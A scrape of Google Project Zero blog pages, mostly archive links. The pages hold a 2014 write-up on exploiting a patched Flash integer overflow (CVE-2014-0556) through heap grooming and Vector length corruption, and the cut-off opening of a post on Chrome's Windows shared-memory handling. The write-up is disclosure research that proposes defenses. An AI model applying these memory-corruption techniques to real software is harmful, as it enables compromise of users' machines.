    [December](https://googleprojectzero.blogspot.com/2021/12/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2021/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2021/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2021/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2021/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2021/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2021/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2021/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2021/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2021/01/)
    (10)

* ►
  [2020](https://googleprojectzero.blogspot.com/2020/)
  (36)
  + ►
    [December](https://googleprojectzero.blogspot.com/2020/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2020/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2020/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2020/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2020/08/)
    (5)
  + ►
    [July](https://googleprojectzero.blogspot.com/2020/07/)
    (8)
  + ►
    [June](https://googleprojectzero.blogspot.com/2020/06/)
    (2)
  + ►
    [April](https://googleprojectzero.blogspot.com/2020/04/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2020/02/)
    (4)
  + ►
    [January](https://googleprojectzero.blogspot.com/2020/01/)
    (5)

* ►
  [2019](https://googleprojectzero.blogspot.com/2019/)
  (27)
  + ►
    [December](https://googleprojectzero.blogspot.com/2019/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2019/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2019/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2019/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2019/08/)
    (11)
  + ►
    [May](https://googleprojectzero.blogspot.com/2019/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2019/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2019/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2019/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2019/01/)
    (2)

* ►
  [2018](https://googleprojectzero.blogspot.com/2018/)
  (22)
  + ►
    [December](https://googleprojectzero.blogspot.com/2018/12/)
    (7)
  + ►
    [November](https://googleprojectzero.blogspot.com/2018/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2018/10/)
    (4)
  + ►
    [September](https://googleprojectzero.blogspot.com/2018/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2018/08/)
    (3)
  + ►
    [July](https://googleprojectzero.blogspot.com/2018/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2018/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2018/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2018/04/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2018/01/)
    (1)

* ►
  [2017](https://googleprojectzero.blogspot.com/2017/)
  (19)
  + ►
    [December](https://googleprojectzero.blogspot.com/2017/12/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2017/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2017/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2017/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2017/07/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2017/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2017/04/)
    (6)
  + ►
    [March](https://googleprojectzero.blogspot.com/2017/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2017/02/)
    (2)

* ►
  [2016](https://googleprojectzero.blogspot.com/2016/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2016/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2016/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2016/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2016/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2016/08/)
    (1)
  + ►
    [July](https://googleprojectzero.blogspot.com/2016/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2016/06/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2016/03/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2016/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2016/01/)
    (1)

* ►
  [2015](https://googleprojectzero.blogspot.com/2015/)
  (33)
  + ►
    [December](https://googleprojectzero.blogspot.com/2015/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2015/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2015/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2015/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2015/08/)
    (6)
  + ►
    [July](https://googleprojectzero.blogspot.com/2015/07/)
    (5)
  + ►
    [June](https://googleprojectzero.blogspot.com/2015/06/)
    (4)
  + ►
    [May](https://googleprojectzero.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2015/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2015/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2015/02/)
    (3)
  + ►
    [January](https://googleprojectzero.blogspot.com/2015/01/)
    (2)

* ▼
  [2014](https://googleprojectzero.blogspot.com/2014/)
  (11)
  + ►
    [December](https://googleprojectzero.blogspot.com/2014/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2014/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2014/10/)
    (2)
  + ▼
    [September](https://googleprojectzero.blogspot.com/2014/09/)
    (1)
    - [Exploiting CVE-2014-0556 in Flash](https://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html)
  + ►
    [August](https://googleprojectzero.blogspot.com/2014/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2014/07/)
    (3)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from googleprojectzero.blogspot.com_ece488f6_20250126_083226.html ===


# [Project Zero](https://googleprojectzero.blogspot.com/)

News and updates from the Project Zero team at Google

## Tuesday, September 23, 2014

### [Exploiting CVE-2014-0556 in Flash](https://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html)

Posted by Chris Evans, Kidnapper of RIP

A couple of weeks ago, Adobe released [security bulletin APSB14-21](http://helpx.adobe.com/security/products/flash-player/apsb14-21.html), including 8 fixes for bugs reported by Project Zero. Full details of these bugs are now public in our bug tracker. Some of the more interesting ones are a [double free in the RTMP protocol](https://code.google.com/p/google-security-research/issues/detail?id=76), or an [integer overflow concatenating strings](https://code.google.com/p/google-security-research/issues/detail?id=78). Again, we’d like to thank Adobe for a response time well ahead of our standard 90-day disclosure deadline.

The focus of this post is an [integer overflow leading to a buffer overflow in an ActionScript API](https://code.google.com/p/google-security-research/issues/detail?id=46).

Prelude
Before we get started, though, it’s worth briefly noting why there is so much value in writing an exploit. Finding and eliminating bugs obviously improves software correctness, but writing exploits is always a significant learning opportunity. Throughout the history of the security industry, there’s a long track record of offense driving defense, leading to technologies such as stack canaries, NX support in processors and ASLR.

Project Zero is not just a bug hunting initiative. We’re doing our part to continue the tradition of practical and public research of exploitation techniques -- and deriving defenses from them. For example, our [glibc defensive patch](https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=52ffbdf25a1100986f4ae27bb0febbe5a722ab25) was accepted as a follow-on from our [glibc exploit](http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html).

The case of this particular exploit starts with some irony on account of my overly hasty initial triage of the bug based on instincts which were later proved wrong by a more in-depth analysis of exploitation opportunities. In the bug history, you can see the claim “almost certainly 64-bit only” (wrong!) and then “does not work in Chrome 64-bit Linux”. We learned not to declare anything as unexploitable in our previous post about [exploiting a subtle condition in glibc](http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html). Therefore, I had to declare shenanigans on myself and tackle the challenge: exploit this bug on Chrome 64-bit Linux.

The bug
The bug is triggered by calling BitmapData.copyPixelsToByteArray() with a reference to a ByteArray that has its position property set very large -- close to 2^32. This results in an integer overflow in 32-bit arithmetic. This occurs even on 64-bit because the relevant positions and length variables are (quite reasonably) stored in 32-bit variables. The code then believes that it can copy the pixels, starting to write them at position, and stay within the bounds of the buffer. Instead, a buffer overflow occurs. On 32-bit, the out-of-bounds write will be written before the start of the buffer because the pointer will wrap. On 64-bit, things are not as kind to the attacker. On a typical 64-bit Linux process setup with a 1MB buffer, the situation will look like this:

… | buffer: 1MB | heap, libs, binary |                 !!

The out-of-bounds write (in red) is at approximately buffer + 4GB. This will not wrap around the massive 64-bit address space, leading to a write way off in unmapped space. Insta-crash. The most obvious way to avoid the crash is to make the buffer massive, almost 4GB, leading to this situation:

… | buffer: 4GB                                      | !! heap, libs, binary |

This is readily exploitable. However, 64-bit Chrome on Linux has a defensive measure where the amount of mapped address space is limited to 4GB. So the large buffer allocation will fail and prevent that particular attack.

The heap groom
We’re going to need a trick to exploit this without slamming into the 4GB address space limit. The breakthrough -- that did not occur to me before attempting to develop an exploit -- comes when we realize that we don’t need to have the address space contiguously mapped. The out-of-bounds write will happily still go ahead even if it “jumps over” a hole in the address space. By having a hole in the address space, perhaps we can usefully trigger the corruption with less than 4GB mapped.

But how do we put this hole where we want it? Looking at how the Flash allocator works using the strace system tool, we see that very large allocations are serviced using unhinted mmap(). The Linux standard algorithm for servicing unhinted mmap() calls is to stack them adjacent and downwards in address space, as long as there isn’t a hole that can satisfy the request. So let’s see what happens when we allocate two 1GB chunks:

… | buffer2: 1GB | buffer1: 1GB | heap, libs, binary |

And the free the first one (a direct munmap() call is seen):

… | buffer2: 1GB |   1GB hole   | heap, libs, binary |

And then allocate a 2GB buffer (too big to fit in the hole):

… | buffer3: 2GB        | buffer2: 1GB |   1GB hole   | !! heap, libs, binary |

Aha! We’ve managed to engineer a situation where we’ve never had more than 4GB of address space mapped at any given moment, and at the end, a corruption at buffer3 + 4GB will land right in a writable region: the heap.

The corruption target
Now that we have a reasonably controlled memory corruption situation, we need to pick something to corrupt. As is pretty standard in modern heap buffer overflow exploitation in a scripting environment, we’re going to try and clobber a length of an array-like object. If we clobber any such length to be larger, we will then be able to read and write arbitrary relative heap memory. Once we’ve achieved such a powerful primitive, it’s essentially game over. Successful exploitation is pretty much assured: defeat ASLR by reading the value of a vtable and then write a new vtable that causes execution redirection to a sequence of opcodes that we choose.

We decide to corrupt a Vector.<uint> buffer object. This is a fairly standard, documented technique. I recommend Haifei Li’s [excellent paper as background reading](http://0xfeedface.org/sites/default/files/smashing_the_heap_with_vector_Li.pdf). Corrupting this buffer object is an obvious target because of three properties it possesses:

* The attacker can choose arbitrary sizes for these objects, meaning there is a lot of control over where in the heap they are placed relative to the pending heap corruption.
* The object starts with a length field, and corrupting it results in arbitrary heap relative read/write being exposed to script.
* The object is resilient to corruption in general. Aside from the length field, there is just a single pointer and trashing this pointer does not affect the ability to use the Vector, or otherwise cause noticeable stability issues during the course of exploitation. (We could even restore its value post-exploitation if we wished.)

To proceed, we simply create many (32) Vector.<uint> objects, all with buffers sized at about 2MB. These typically end up being stacked downwards at the top of the 1GB hole. In reality, the 1GB and 2GB allocations end up being a little larger than expected under the covers. This means that the corruption address of buffer3 + 4GB actually ends up corrupting objects within the 1GB hole instead of after it. This is ideal because we can make sure that only our large buffers are corrupted. In terms of the actual data to write, we just use the default values in an empty BitmapData, which are 0xffffffff (white pixels with a full alpha channel). 0xffffffff is a plenty large enough length to proceed with the exploit!

Proceeding onwards
There is nothing particularly exciting or unique about how the exploit proceeds to demonstrate code execution, so we’ll skip the lengthy explanation here. I’ve made an attempt to fully comment the exploit source code, so if you want to continue to follow along I recommend you read the materials attached to the [public bug](https://code.google.com/p/google-security-research/issues/detail?id=46).

The only part I’d flag as mildly interesting -- because it differs from the previously quoted paper -- is how we get known data at a known heap address. We do it with a Vector.<uint> object again. Each of these is in fact a pair of objects: a script object, which is a fixed sized and contains metadata; and the buffer object which contains the arbitrary data prefixed by the length. The script object forms a distinct pattern in memory and also contains a pointer to the buffer object. By locating any Vector.<uint> script object, we can then use a raw memory edit to change a property of the object. This property change will be visible to ActionScript so we then know which handle corresponds to a buffer at which raw address.

Conclusions, and turning what we’ve learned into generic defenses
Various technologies would have changed the exploitation landscape here, and can now be investigated in more detail:

* Randomized placement of large memory chunks. Non-deterministic placement of large allocations would have broken the heap grooming aspect of the exploit.
* Isolation of Vector.<uint> buffers. As we’ve seen, corruption of these buffers is an extremely dangerous condition. Some of the most recent advances in memory corruption defenses have been [“isolated” or “partitioned” heaps](https://labs.mwrinfosecurity.com/blog/2014/06/20/isolated-heap-friends---object-allocation-hardening-in-web-browsers/). These technologies seem applicable here. (They would need to be applied not just to the Vector buffers, but to the general case: partitioning off read/write objects where the attacker controls both the size and the content.)

Given the open-source nature of the [ActionScript engine](https://github.com/adobe-flash/avmplus), and the open-source nature of some [potentially helpful technologies](https://chromium.googlesource.com/chromium/blink/%2B/master/Source/wtf/PartitionAlloc.h), a prototype of a generic defense is now on the Project Zero TODO list!

Posted by
Anonymous

at

[12:31 AM](https://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html "permanent link")

[3 comments:](https://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=304895122341465676&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=pinterest "Share to Pinterest")

[Newer Posts](https://googleprojectzero.blogspot.com/search?updated-max=2014-10-20T12:50:00-07:00&max-results=1&reverse-paginate=true "Newer Posts")

[Older Posts](https://googleprojectzero.blogspot.com/search?updated-max=2014-09-23T00:31:00-07:00&max-results=1 "Older Posts")

[Home](https://googleprojectzero.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://googleprojectzero.blogspot.com/feeds/posts/default)

## Search This Blog

|  |  |
| --- | --- |

## Pages

* [About Project Zero](https://googleprojectzero.blogspot.com/p/about-project-zero.html)
* [Working at Project Zero](https://googleprojectzero.blogspot.com/p/working-at-project-zero.html)
* [0day "In the Wild"](https://googleprojectzero.blogspot.com/p/0day.html)
* [0day Exploit Root Cause Analyses](https://googleprojectzero.github.io/0days-in-the-wild/rca.html)
* [Vulnerability Disclosure FAQ](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html)

## Archives

* ►
  [2024](https://googleprojectzero.blogspot.com/2024/)
  (12)
  + ►
    [December](https://googleprojectzero.blogspot.com/2024/12/)
    (3)
  + ►
    [November](https://googleprojectzero.blogspot.com/2024/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2024/10/)
    (2)
  + ►
    [June](https://googleprojectzero.blogspot.com/2024/06/)
    (3)
  + ►
    [April](https://googleprojectzero.blogspot.com/2024/04/)
    (2)

* ►
  [2023](https://googleprojectzero.blogspot.com/2023/)
  (11)
  + ►
    [November](https://googleprojectzero.blogspot.com/2023/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2023/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2023/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2023/08/)
    (4)
  + ►
    [April](https://googleprojectzero.blogspot.com/2023/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2023/03/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2023/01/)
    (2)

* ►
  [2022](https://googleprojectzero.blogspot.com/2022/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2022/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2022/11/)
    (3)
  + ►
    [October](https://googleprojectzero.blogspot.com/2022/10/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2022/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2022/06/)
    (3)
  + ►
    [May](https://googleprojectzero.blogspot.com/2022/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2022/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2022/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2022/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2022/01/)
    (1)

* ►
  [2021](https://googleprojectzero.blogspot.com/2021/)
  (24)
  + ►
    [December](https://googleprojectzero.blogspot.com/2021/12/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2021/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2021/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2021/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2021/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2021/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2021/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2021/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2021/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2021/01/)
    (10)

* ►
  [2020](https://googleprojectzero.blogspot.com/2020/)
  (36)
  + ►
    [December](https://googleprojectzero.blogspot.com/2020/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2020/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2020/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2020/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2020/08/)
    (5)
  + ►
    [July](https://googleprojectzero.blogspot.com/2020/07/)
    (8)
  + ►
    [June](https://googleprojectzero.blogspot.com/2020/06/)
    (2)
  + ►
    [April](https://googleprojectzero.blogspot.com/2020/04/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2020/02/)
    (4)
  + ►
    [January](https://googleprojectzero.blogspot.com/2020/01/)
    (5)

* ►
  [2019](https://googleprojectzero.blogspot.com/2019/)
  (27)
  + ►
    [December](https://googleprojectzero.blogspot.com/2019/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2019/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2019/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2019/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2019/08/)
    (11)
  + ►
    [May](https://googleprojectzero.blogspot.com/2019/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2019/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2019/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2019/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2019/01/)
    (2)

* ►
  [2018](https://googleprojectzero.blogspot.com/2018/)
  (22)
  + ►
    [December](https://googleprojectzero.blogspot.com/2018/12/)
    (7)
  + ►
    [November](https://googleprojectzero.blogspot.com/2018/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2018/10/)
    (4)
  + ►
    [September](https://googleprojectzero.blogspot.com/2018/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2018/08/)
    (3)
  + ►
    [July](https://googleprojectzero.blogspot.com/2018/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2018/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2018/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2018/04/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2018/01/)
    (1)

* ►
  [2017](https://googleprojectzero.blogspot.com/2017/)
  (19)
  + ►
    [December](https://googleprojectzero.blogspot.com/2017/12/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2017/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2017/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2017/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2017/07/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2017/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2017/04/)
    (6)
  + ►
    [March](https://googleprojectzero.blogspot.com/2017/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2017/02/)
    (2)

* ►
  [2016](https://googleprojectzero.blogspot.com/2016/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2016/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2016/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2016/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2016/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2016/08/)
    (1)
  + ►
    [July](https://googleprojectzero.blogspot.com/2016/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2016/06/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2016/03/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2016/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2016/01/)
    (1)

* ►
  [2015](https://googleprojectzero.blogspot.com/2015/)
  (33)
  + ►
    [December](https://googleprojectzero.blogspot.com/2015/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2015/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2015/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2015/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2015/08/)
    (6)
  + ►
    [July](https://googleprojectzero.blogspot.com/2015/07/)
    (5)
  + ►
    [June](https://googleprojectzero.blogspot.com/2015/06/)
    (4)
  + ►
    [May](https://googleprojectzero.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2015/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2015/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2015/02/)
    (3)
  + ►
    [January](https://googleprojectzero.blogspot.com/2015/01/)
    (2)

* ▼
  [2014](https://googleprojectzero.blogspot.com/2014/)
  (11)
  + ►
    [December](https://googleprojectzero.blogspot.com/2014/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2014/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2014/10/)
    (2)
  + ▼
    [September](https://googleprojectzero.blogspot.com/2014/09/)
    (1)
    - [Exploiting CVE-2014-0556 in Flash](https://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html)
  + ►
    [August](https://googleprojectzero.blogspot.com/2014/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2014/07/)
    (3)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from googleprojectzero.blogspot.com_a8cd49dd_20250126_083144.html ===


# [Project Zero](https://googleprojectzero.blogspot.com/)

News and updates from the Project Zero team at Google

## Monday, October 20, 2014

### [Did the “Man With No Name” Feel Insecure?](https://googleprojectzero.blogspot.com/2014/10/did-man-with-no-name-feel-insecure.html)

Posted by James Forshaw, Taker of Names

Sometimes when I'm doing security research I'll come across a bug which surprises me. I discovered just such a bug in the Windows version of Chrome which exposed a little-known security detail in the OS. The bug, [CVE-2014-3196](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3196) was fixed in [M38](http://googlechromereleases.blogspot.co.uk/2014/10/stable-channel-update.html), so it seemed a good time for a blog post. The actual reported issue is [here](https://code.google.com/p/chromium/issues/detail?id=338538). While the bug didn’t allow for a full sandbox escape it did provide the initial part of a chain; something that’s still important to fix.

The security of an OS kernel is of extreme importance to modern user-mode sandboxes such as is used in Chrome. Some OS kernels have built-in facilities for reducing the attack surface of the kernel and the OS in general, for example [seccomp](https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt) on Linux or the [sandbox facilities](https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/sandbox-exec.1.html#//apple_ref/doc/man/1/sandbox-exec) in OS X. While not always perfect they are valuable facilities for Chrome. Windows 8 introduced some steps towards improving sandboxing, such as the AppContainer model and the ability to [disable Win32k system calls](http://msdn.microsoft.com/en-gb/library/windows/desktop/hh871472%28v%3Dvs.85%29.aspx). Chrome has experimental support for disabling Win32k (through the --enable\_win32k\_renderer\_lockdown flag), but for many other features it has to make do with what’s available.

On Windows, Chrome relies on the built-in NT permissions model to secure resources from code executing within a sandboxed process. The Windows NT operating system was built with security in mind (no laughing at the back) including a robust and flexible permission model for securing resources. There are two parts to securing resources, the [Access Token](http://msdn.microsoft.com/en-us/library/windows/desktop/aa374909%28v%3Dvs.85%29.aspx) which acts as the identity of a process and the [Discretionary Access Control List (DACL)](http://msdn.microsoft.com/en-us/library/windows/desktop/aa446597%28v%3Dvs.85%29.aspx) that defines the list of users and groups which can access a resource and what permissions they would be granted. The set of permissions allowed is quite granular (and dependant on the object type), but typically there are separate permissions for read, write and execute operations.

When a user mode process [requests access](http://msdn.microsoft.com/en-gb/library/windows/desktop/aa446683%28v%3Dvs.85%29.aspx) to a securable kernel object the kernel's security manager verifies the process Access Token has access to that resource with the required sets of permissions as defined in the DACL. If all permissions are allowed then a Handle is generated, an opaque reference to the object, and returned to the process which can use it in subsequent system calls. Many resources also have the ability to have an assigned name. Think of the name like a file path which represents how to find and open a new handle to the object. You can browse named objects using the [WinObj](http://technet.microsoft.com/en-gb/sysinternals/bb896657.aspx) tool from Sysinternals.
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQySKJ-c3CsMft5Lcz9Cfif4qHuPDvF3rRxIoyByLchUxLuaKEP7cnhanlKyL-214gU2d2jRTk5nrxXWJxl31oUrS4-42rGb-jvw98uI6FyqesNyYGp1jq9SIKDEvMoNUfgzYir0apdMETeGY-1OMPujMpzgrpvpFzzQgKG66bweSUNaQYKBTQcQ-Y/s600/UdLBPrGp-OYm1IZcIj-dbyKxAwQBZMZ7gNbvWeVm8MmEGuL2J3lx2b_NkpVBM0iwXi0czL-l4dLMc4IO2iQVWglJJtf_QQeaY__JpxPW6Le6aSER2wMBXjd0bpSoBBhAw4WgKVQ.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQySKJ-c3CsMft5Lcz9Cfif4qHuPDvF3rRxIoyByLchUxLuaKEP7cnhanlKyL-214gU2d2jRTk5nrxXWJxl31oUrS4-42rGb-jvw98uI6FyqesNyYGp1jq9SIKDEvMoNUfgzYir0apdMETeGY-1OMPujMpzgrpvpFzzQgKG66bweSUNaQYKBTQcQ-Y/s600/UdLBPrGp-OYm1IZcIj-dbyKxAwQBZMZ7gNbvWeVm8MmEGuL2J3lx2b_NkpVBM0iwXi0czL-l4dLMc4IO2iQVWglJJtf_QQeaY__JpxPW6Le6aSER2wMBXjd0bpSoBBhAw4WgKVQ.png)
One such securable resource is shared memory sections, sometimes called memory-mapped files. On Windows this is created through the [CreateFileMapping](http://msdn.microsoft.com/en-gb/library/windows/desktop/aa366537%28v%3Dvs.85%29.aspx) API function. If you look at the API you'll notice that it has a final parameter which specifies the name of the object. Shared memory sections are used when Chrome needs to share large amounts of data between sandboxed processes and the privileged broker process. The kernel defines a few permissions a program can request when accessing a section object; the most important for our purposes are FILE\_MAP\_WRITE which gives the program the ability to map the memory writable and FILE\_MAP\_READ which gives the program read-only access. If a program is only granted FILE\_MAP\_READ the kernel will ensure it cannot be mapped writable.

One useful feature of shared memory is that a process can create the memory and then share a read-only copy with other processes. This allows a higher privileges process to provide a real-time copy of data which only it can update. A typical way to share sections read-only on Windows is to name them when they're created writeable in the original process. Then by applying an appropriate DACL a sandboxed process calling the [OpenFileMapping](http://msdn.microsoft.com/en-gb/library/windows/desktop/aa366791%28v%3Dvs.85%29.aspx) function can only be granted the FILE\_MAP\_READ permission. In Chrome’s case, sections are not shared by providing a name. Instead it uses a different method which we can see by looking at the source code. In the base/memory directory you'll find Chrome's implementation of shared memory for the different platforms. In the [header](https://code.google.com/p/chromium/codesearch#chromium/src/base/memory/shared_memory.h&q=SharedMemory&sq=package:chromium&type=cs&l=32) you'll find an important function:

bool ShareReadOnlyToProcess(ProcessHandle process,
                            SharedMemoryHandle\* new\_handle) {
  return ShareToProcessCommon(process, new\_handle, false,
                              SHARE\_READONLY);
}

